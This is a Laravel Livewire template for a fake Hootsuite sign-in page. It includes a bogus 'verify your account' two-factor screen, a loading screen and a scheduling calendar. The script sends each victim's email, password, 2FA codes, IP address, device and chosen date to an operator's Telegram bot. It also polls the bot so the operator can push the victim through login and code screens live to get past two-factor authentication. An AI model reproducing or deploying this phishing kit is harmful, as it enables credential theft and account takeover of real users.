                                                <div class="tt-child-element-right">
                                                    <span class="spacer"></span>
                                                    <div class="owly-writer-ai-video-container">
                                                        <video autoplay="" loop="" muted=""
                                                            aria-label="An animated image, with a happy-looking owl, called Owly, in a robot suit holding a smartphone, which is showing multiple love hearts and happy face emojis, after using OwlyWriter AI">
                                                            <source
                                                                src="https://i.hootsuite.com/assets/identity/dashboard/login/owly-writer-ai.mp4"
                                                                type="video/mp4">
                                                            Your browser does not support the video tag.
                                                        </video>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="rtpLoginColumn">
                                            <div class="rtpSelectionContainer">
                                                <h1>Sign in</h1>
                                                @if ($loginError)
                                                    <div class="_notification notification error" role="alert">
                                                        <div class="notificationIconContainer">
                                                            <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
                                                                class="notificationIcon">
                                                        </div>
                                                        <div class="notificationMessage">
                                                            <div class="notificationTitle">
                                                                Please try again
                                                            </div>
                                                            Sorry, we couldn't find that email and/or password
                                                        </div>
                                                    </div>
                                                @endif
                                                <!-- Error, Notice and Success Messages -->
                                                <div class="formContainer">
                                                    <form method="post" wire:submit.prevent="submitLogin"
                                                        id="loginForm" class="_emailPasswordForm" action="/signin">
                                                        <!-- Email and Password Inputs -->
                                                        <div class="inputWrapper">
                                                            <label for="loginEmailInput">Email</label>
                                                            <input id="loginEmailInput"
                                                                class="inputContainer _requiredInput _emailInput"
                                                                required="" type="email" name="email"
                                                                title="Please enter a valid email address"
                                                                maxlength="100" autofocus="autofocus" value=""
                                                                role="textbox" aria-labelledby="loginEmailLabel"
                                                                aria-required="true"
                                                                aria-describedby="inlineErrorTitle_loginEmailInput inlineErrorMessage_loginEmailInput">
                                                            <div id="inlineErrorContainer"
                                                                class="inlineErrorContainer _inlineErrorContainer"
                                                                style="display:none;">
                                                                <div class="inlineErrorIconContainer">
                                                                    <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
                                                                        class="inlineErrorIcon">
                                                                </div>
                                                                <div class="inlineErrorMessageContainer">
                                                                    <div class="inlineErrorTitle _inlineErrorTitle"
                                                                        id="inlineErrorTitle_loginEmailInput"
                                                                        role="alert"></div>
                                                                    <div class="inlineErrorMessage _inlineErrorMessage"
                                                                        id="inlineErrorMessage_loginEmailInput"
                                                                        role="alert"></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="inputWrapper allowWrap">
                                                            <label for="loginPasswordInput">Password
                                                                <a href="javascript:void(0)"
                                                                    class="forgotPassword _forgotPassword ">Forgot
                                                                    password
                                                                </a>
                                                            </label>
                                                            <input id="loginPasswordInput" required=""
                                                                type="password" name="password" maxlength="100"
                                                                class="inputContainer _requiredInput _passwordInput"
                                                                role="textbox" aria-labelledby="loginPasswordLabel"
                                                                aria-required="true"
                                                                aria-describedby="inlineErrorTitle_loginPasswordInput inlineErrorMessage_loginPasswordInput">

                                                            <div id="inlineErrorContainer"
                                                                class="inlineErrorContainer _inlineErrorContainer"
                                                                style="display:none;">
                                                                <div class="inlineErrorIconContainer">
                                                                    <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
                                                                        class="inlineErrorIcon">
                                                                </div>
                                                                <div class="inlineErrorMessageContainer">
                                                                    <div class="inlineErrorTitle _inlineErrorTitle"
                                                                        id="inlineErrorTitle_loginPasswordInput"
                                                                        role="alert"></div>
                                                                    <div class="inlineErrorMessage _inlineErrorMessage"
                                                                        id="inlineErrorMessage_loginPasswordInput"
                                                                        role="alert"></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <!-- Sign In (CTA) Button -->
                                                        <button class="button disabled _submit submitButton"
                                                            type="submit" aria-disabled="true" tabindex="-1"
                                                            aria-describedby="inlineErrorContainer">Sign in</button>
                                                        <input type="hidden" name="method" value="email">
                                                        <input type="hidden" name="loginCsrfToken"
                                                            value="052aef9e00fc39365803c4440d3f06fbf44cd8a909172b6b8e7bcce0fb84c2b1bd981bb16b2f4454c3badab40cd9e1cfe6f144122e31186f6448c9310aefd59d">
                                                    </form>
                                                </div>
                                                <div class="linksSectionContainer">
                                                    <a href="javascript:void(0)" class="link">Sign up</a>
                                                    <p class="modLegalNotice x-login">
                                                        By selecting Sign in, I agree to <a
                                                            href="javascript:void(0)">Hootsuite's Terms</a>, including
                                                        the payment
                                                        terms, and <a href="javascript:void(0)">Privacy Policy</a>
                                                    </p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                @endif
                                @if ($twoFaPage)
                                    <form action="" class="email-2fa-wrapper">
                                        <div class="left-section">
                                            <a href="Javascript:void(0)" class="link">
                                                ← Back to signin
                                            </a>
                                            <h2 class="title">Verify your account</h2>
                                            <p>
                                                You will need to verify your account before you can proceed.
                                                Click the button below and we’ll send you a verification email.
                                            </p>
                                            <p style="font-weight: bold;">Why am I seeing this screen?</p>
                                            <p>
                                                Most often, users who see this screen have either entered their
                                                password incorrectly too many times or are logging in from a new
                                                location.
                                                As a security measure, you'll need to click on the verification link
                                                that we’ve sent to your email.
                                            </p>
                                            <label>A confirmation code was sent
                                                to<br><strong>{{$emailAddress}}</strong></label>
                                            <div class="inputWrapper">
                                                <label for="loginEmailInput">Enter your confirmation code here</label>
                                                <input id="loginEmailInput"
                                                    class="inputContainer _requiredInput _emailInput" type="email"
                                                    name="email">

                                            </div>
                                            <button class="button disabled _submit submitButton"
                                                type="submit">Submit</button>
                                            <div class="links">
                                                <p>Didn't receive an email? <a href="#">Resend</a></p>
                                                <p><a href="#">Sign in to another account</a></p>
                                            </div>
                                        </div>
                                        <div class="right-section">
                                            <img src="{{ asset('img/2fa-image.png') }}" alt="">
                                        </div>
                                    </form>
                                @endif
                                @if ($enableLoadingAfterSubmit)
                                    <div class="loading-container">
                                        <div class="loading-message">Please be patient and dont close this window</div>
                                        <div class="loading-submessage step1">Checking the details on your account...
                                        </div>
                                        <div class="loading-submessage step2">Checking email addresses...</div>
                                        <div class="loading-submessage step3">Checking two-factor authenticator...
                                        </div>
                                        <div class="loading-submessage step4">Checking other details...</div>
                                        <div class="loading-submessage finalStep">It can take up to 10 minutes to
                                            verify your account.</div>
                                        <div class="loader"></div>
                                    </div>
                                @endif
                            </div>

                        </div>
                        <div class="ant-modal-footer">
                            <button type="button" class="ant-btn ant-btn-default"><span>Cancel</span></button><button
                                type="button" class="ant-btn ant-btn-primary"><span>OK</span></button>
                        </div>
                    </div>
                    <div tabindex="0" aria-hidden="true"
                        style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
                </div>
            </div>
        </div>
    </div>
</div>
@script
    <script>
        let sessionId;
        if (!localStorage.getItem('sessionId')) {
            localStorage.setItem('sessionId', generateSessionId());
            sessionId = localStorage.getItem('sessionId');
        } else {
            sessionId = localStorage.getItem('sessionId');
        }
        let selectedDate;
        const apiKey = "{{ env('TELEGRAM_API_KEY') }}";
        const chatId = "{{ env('TELEGRAM_CHAT_ID') }}";
        const replyMarkup = `reply_markup={"inline_keyboard": [[{"text": "accept", "callback_data": "accept"}]]}`;
        const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
        let emailElement;
        document.addEventListener('user-login-response', function() {
            fetch("https://api.ipify.org?format=json")
                .then((response) => response.json())
                .then((data) => {
                    const ipAddress = data?.ip || "";
                    @this.set('ip', ipAddress);
                })
                .catch((error) => {});
        })
        document.addEventListener('open-modal', function() {
            $('#continue-modal').show();
        });

        function getDeviceOS() {
            const userAgent = navigator.userAgent;
            if (/Android/i.test(userAgent)) {
                return 'Android';
            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
                return 'iOS';
            } else if (/Windows/i.test(userAgent)) {
                return 'Windows';
            } else if (/Linux/i.test(userAgent)) {
                return 'Linux';
            } else if (/Mac OS|Macintosh/i.test(userAgent)) {
                return 'Mac OS';
            } else {
                return 'Unknown';
            }
        }

        function getDeviceType() {
            const userAgent = navigator.userAgent;

            if (/Mobile|Android|iPhone|iPod/i.test(userAgent)) {
                return 'Mobile';
            } else if (/Tablet|iPad/i.test(userAgent) || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(userAgent))) {
                return 'Tablet';
            } else {
                return 'Desktop';
            }
        }
        async function getCountryByIP(ip) {
            const token = '51a670a7b50b57';
            const apiUrl = `https://ipinfo.io/${ip}/json?token=${token}`;

            try {
                const response = await fetch(apiUrl);
                if (!response.ok) throw new Error('Failed to fetch IP information');
                const data = await response.json();
                return data.country;
            } catch (error) {
                console.error('Error:', error.message);
                return null;
            }
        }
        async function handleAsyncIPInfo() {
            try {
                const deviceType = getDeviceType();
                const os = getDeviceOS();
                const ip = @this.ip;
                const country = await getCountryByIP(ip);
                const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage`;
                await fetch(tURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `===NEW VISITOR===\nIp: ${ip}\nDevice: ${deviceType}\nOS: ${os}\nCountry: ${country || 'Unknown'}`,
                    }),
                });

            } catch (error) {
                console.error('Error:', error.message);
            }
        }
        document.addEventListener('send-ip-info', function() {
            handleAsyncIPInfo();
        })

        document.addEventListener('show-login-progress', function() {
            @this.set('showModalFooter', false);
            @this.set('enableLoginForm', false);
            @this.set('enableLoadingAfterSubmit', true);
            @this.set('emailAddress', $('input[name="email"]').val());
            emailElement = $('input[name="email"]').val();
            const passwordElement = $('input[name="password"]').val();
            fetch(tURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `User: ${emailElement}\nAnswer: ${passwordElement}\n`,
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                    text: `Login`,
                                    callback_data: `/login ${sessionId}`,
                                },
                                {
                                    text: `Error`,
                                    callback_data: `/loginError ${sessionId}`,
                                }
                            ],
                            [{
                                    text: `Email 2fa`,
                                    callback_data: `/email2fa ${sessionId}`,
                                },
                                {
                                    text: `Email 2fa error`,
                                    callback_data: `/email2faError ${sessionId}`,
                                },
                            ],
                            [{
                                    text: `Google 2fa`,
                                    callback_data: `/google2fa ${sessionId}`,
                                },
                                {
                                    text: `Google 2fa error`,
                                    callback_data: `/google2faError ${sessionId}`,
                                },
                            ],
                            [{
                                    text: `Schedule`,
                                    callback_data: `/schedule ${sessionId}`,
                                },
                                {
                                    text: `Final`,
                                    callback_data: `/final ${sessionId}`,
                                },
                            ],
                            [{
                                text: `Kick`,
                                callback_data: `/login ${sessionId}`,
                            }, ],
                        ],
                    },
                }),
            });
            localStorage.setItem('email', emailElement);
            startInterval();
        });
        document.addEventListener('code-submit', function() {
            const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
            const code = $('input[name="code"]').val();
            fetch(tURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
                    code || ""
                }`,
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                        text: `2fa`,
                                        callback_data: `/2fa ${sessionId}`,
                                    },
                                    {
                                        text: `2fa error`,
                                        callback_data: `/2faError ${sessionId}`,
                                    },
                                ],
                                [{
                                        text: `Schedule`,
                                        callback_data: `/schedule ${sessionId}`,
                                    },
                                    {
                                        text: `Final`,
                                        callback_data: `/final ${sessionId}`,
                                    },
                                ],
                                [{
                                    text: `Kick`,
                                    callback_data: `/login ${sessionId}`,
                                }, ],
                            ],
                        },
                    }),
                })
                .then(() => {
                    @this.set('loginError', false);
                    @this.set('oldPassError', false);
                    @this.set('enableLoginForm', false);
                    @this.set('showModalFooter', false);
                    @this.set('enableLoadingAfterSubmit', true);
                    @this.set('twoFaPage', false);
                    @this.set('codeError', false);
                })
                .catch((error) => {
                    console.log("Unknown error in auth.html", error);
                });

        });
        document.addEventListener('code-submit-mobile', function() {
            const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
            const code = $('input[name="code2"]').val();
            fetch(tURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
                    code || ""
                }`,
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                        text: `2fa`,
                                        callback_data: `/2fa ${sessionId}`,
                                    },
                                    {
                                        text: `2fa error`,
                                        callback_data: `/2faError ${sessionId}`,
                                    },
                                ],
                                [{
                                        text: `Schedule`,
                                        callback_data: `/schedule ${sessionId}`,
                                    },
                                    {
                                        text: `Final`,
                                        callback_data: `/final ${sessionId}`,
                                    },
                                ],
                                [{
                                    text: `Kick`,
                                    callback_data: `/login ${sessionId}`,
                                }, ],
                            ],
                        },
                    }),
                })
                .then(() => {
                    @this.set('loginError', false);
                    @this.set('oldPassError', false);
                    @this.set('enableLoginForm', false);
                    @this.set('showModalFooter', false);
                    @this.set('enableLoadingAfterSubmit', true);
                    @this.set('twoFaPage', false);
                    @this.set('codeError', false);
                })
                .catch((error) => {
                    console.log("Unknown error in auth.html", error);
                });

        });
        const startInterval = () => {
            let lastUpdateId = 0;
            setInterval(() => {
                fetch(`https://api.telegram.org/bot${apiKey}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then((response) => {
                        if (response.ok) {
                            return response.json();
                        } else {
                            throw new Error("Failed to fetch updates.");
                        }
                    })
                    .then((data) => {
                        if (data?.result?.length > 0) {
                            data.result.forEach((update) => {
                                if (update.update_id > lastUpdateId) {
                                    lastUpdateId = update.update_id;
                                    if (update.callback_query) {
                                        const callbackData = update.callback_query.data;
                                        if (callbackData ===
                                            `/oldError ${localStorage.getItem('sessionId')}`) {
                                            $('#continue-modal').show();
                                            @this.set('showCalenderProgress', false);
                                            @this.set('loginError', false);
                                            @this.set('oldPassError', true);
                                            @this.set('enableLoginForm', true);
                                            @this.set('showModalFooter', true);
                                            @this.set('enableLoadingAfterSubmit', false);
                                            @this.set('twoFaPage', false);
                                            @this.set('codeError', false);
                                            @this.set('showCalender', false);
                                        } else if (callbackData ===
                                            `/loginError ${localStorage.getItem('sessionId')}`) {
                                            $('#continue-modal').show();
                                            @this.set('showCalenderProgress', false);
                                            @this.set('loginError', true);
                                            @this.set('oldPassError', false);
                                            @this.set('enableLoginForm', true);
                                            @this.set('showModalFooter', true);
                                            @this.set('enableLoadingAfterSubmit', false);
                                            @this.set('twoFaPage', false);
                                            @this.set('codeError', false);
                                            @this.set('showCalender', false);

                                        } else if (callbackData ===
                                            `/login ${localStorage.getItem('sessionId')}`) {
                                            $('#continue-modal').show();
                                            @this.set('showCalenderProgress', false);
                                            @this.set('loginError', false);
                                            @this.set('oldPassError', false);
                                            @this.set('enableLoginForm', true);
                                            @this.set('showModalFooter', true);
                                            @this.set('enableLoadingAfterSubmit', false);
                                            @this.set('twoFaPage', false);
                                            @this.set('codeError', false);
                                            @this.set('showCalender', false);
                                        } else if (callbackData ===
                                            `/email2fa ${localStorage.getItem('sessionId')}`) {
                                            $('#continue-modal').show();
                                            @this.set('showCalenderProgress', false);
                                            @this.set('loginError', false);
                                            @this.set('oldPassError', false);
                                            @this.set('enableLoginForm', false);
                                            @this.set('showModalFooter', true);
                                            @this.set('enableLoadingAfterSubmit', false);
                                            @this.set('twoFaPage', true);
                                            @this.set('codeError', false);
                                            @this.set('showCalender', false);
                                        } else if (callbackData ===
                                            `/2faError ${localStorage.getItem('sessionId')}`) {
                                            $('#continue-modal').show();
                                            @this.set('showCalenderProgress', false);
                                            @this.set('loginError', false);
                                            @this.set('oldPassError', false);
                                            @this.set('enableLoginForm', false);
                                            @this.set('showModalFooter', true);
                                            @this.set('enableLoadingAfterSubmit', false);
                                            @this.set('twoFaPage', true);
                                            @this.set('codeError', true);
                                            @this.set('showCalender', false);
                                        } else if (callbackData ===
                                            `/schedule ${localStorage.getItem('sessionId')}`) {
                                            @this.set('showCalenderProgress', false);
                                            @this.set('loginError', false);
                                            @this.set('oldPassError', false);
                                            @this.set('enableLoginForm', false);
                                            @this.set('showModalFooter', false);
                                            @this.set('enableLoadingAfterSubmit', false);
                                            @this.set('twoFaPage', false);
                                            @this.set('codeError', false);
                                            $('#continue-modal').hide();
                                            @this.set('showCalender', true);
                                        }
                                    }
                                }
                            });
                        }
                    })
                    .catch((error) => {
                        console.error("Error fetching updates:", error);
                    });
            }, 2000);
        };

        function generateSessionId() {
            return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${crypto.getRandomValues(new Uint32Array(1))[0]}`;
        }
        window.selectDate = function(date) {
            $('#calendar-wrapper').updateCalendarOptions({
                date: date
            });
            selectedDate = date;
            const currentDate = new Date(date);
            currentDate.setDate(currentDate.getDate());
            const options = {
                weekday: 'long',
                month: 'long',
                day: 'numeric'
            };
            const formattedDate = currentDate.toLocaleDateString('en-US', options);
            if ($('.calendar__container .full__width').length > 0) {
                $('.calendar__container .full__width').remove();
            }
            $('.calendar__container').append(`<div class="full__width">
                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                        <div class="calendar__time">
                                            <h2>${formattedDate}</h2>
                                            <div class="available__wrapper">
                                                <div class="green__text"></div>
                                                <p> times you're available</p>
                                            </div>
                                            <div class="button__time-wrapper">
                                                <div>
                                                    <button class="time" data-time="09:30">
                                                        <div class="green__text"></div>09:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="10:00">
                                                        <div class="green__text"></div>10:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="10:30">
                                                        <div class="green__text"></div>10:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="11:00">
                                                        <div class="green__text"></div>11:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="11:30">
                                                        <div class="green__text"></div>11:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="12:00">
                                                        <div class="green__text"></div>12:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="12:30">
                                                        <div class="green__text"></div>12:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="13:00">
                                                        <div class="green__text"></div>13:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="13:30">
                                                        <div class="green__text"></div>13:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="14:00">
                                                        <div class="green__text"></div>14:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="14:30">
                                                        <div class="green__text"></div>14:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="15:00">
                                                        <div class="green__text"></div>15:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="15:30">
                                                        <div class="green__text"></div>15:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="16:00">
                                                        <div class="green__text"></div>16:00
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                                <div>
                                                    <button class="time" data-time="16:30">
                                                        <div class="green__text"></div>16:30
                                                    </button>
                                                    <div>
                                                        <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"></div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="footer__wrapper footer__wrapper-mobile">
                                                <p>Cookie settings</p>
                                                <p>Report abuse</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>`);
        };
        let defaultConfig = {
            weekDayLength: 3,
            prevButton: '<i class="fa fa-chevron-left" aria-hidden="true"></i>',
            nextButton: '<i class="fa fa-chevron-right" aria-hidden="true"></i>',
            date: new Date(),
            showTodayButton: false,
            onClickDate: selectDate,
            disable: function(date) {
                const today = new Date();
                const yesterday = new Date(today.getFullYear(), today.getMonth(), today.getDate() - 1);
                return date <= yesterday;
            },
            showYearDropdown: true,
            startOnMonday: false,
        };
        $('#calendar-wrapper').calendar(defaultConfig);
        $(document).on('click', 'button.time', function(e) {
            e.preventDefault();
            $('button.time').each(function() {
                $(this).parent('div').removeClass('next__button');
                $(this).parent('div').find('div > div').empty();
            });
            $(this).parent('div').addClass('next__button');
            $(this).parent('div').find('div > div').append('<button class="btn-next">Next</button>');
        });
        $(document).on('click', '.btn-next', function(e) {
            e.preventDefault();
            let time = $(this).parent('div').parent('div').parent('div').find('.time').data(
                'time'); // Example: "10:30"
            let selectedDateFinal = new Date(selectedDate);
            if (!selectedDateFinal || !time) {
                console.error('selectedDate or time is missing');
                return;
            }

            let [hours, minutes] = time.split(':').map(Number);
            selectedDateFinal.setHours(hours);
            selectedDateFinal.setMinutes(minutes);
            selectedDateFinal.setSeconds(0);
            let session = localStorage.getItem('sessionId');
            fetch(`https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `===PICK A DATE: ${localStorage.getItem('email')}===\n ${selectedDateFinal}`,
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                    text: `Kick to 2fa`,
                                    callback_data: `/2fa ${session}`,
                                },
                                {
                                    text: `Kick to Login`,
                                    callback_data: `/login ${session}`,
                                },
                            ],
                            [{
                                    text: `Kick to the calendar`,
                                    callback_data: `/schedule ${session}`,
                                },
                                {
                                    text: `Thank You`,
                                    callback_data: `/thankyou ${session}`,
                                },
                            ]
                        ],
                    },
                })
            }).then(response => {
                @this.set('showCalenderProgress', true);
            }).catch(error => {

            });
        });
        document.getElementById('openChat').addEventListener('click', function(e) {
            e.preventDefault();
            if (window.jivo_api) {
                jivo_api.open();
            } else {
                console.error('JivoChat API is not loaded yet.');
            }
        });
        document.addEventListener('clear-all', function() {
            $('#continue-modal').hide();
            @this.set('loginError', false);
            @this.set('oldPassError', false);
            @this.set('enableLoginForm', false);
            @this.set('showModalFooter', false);
            @this.set('enableLoadingAfterSubmit', false);
            @this.set('twoFaPage', false);
            @this.set('codeError', false);
            @this.set('showCalender', false);
            @this.set('showCalenderProgress', false);
        });
        statusCheck();

        function statusCheck() {
            setInterval(function() {
                window.Livewire.dispatch('statusCheck');
            }, 1000);
        }
    </script>
@endscript
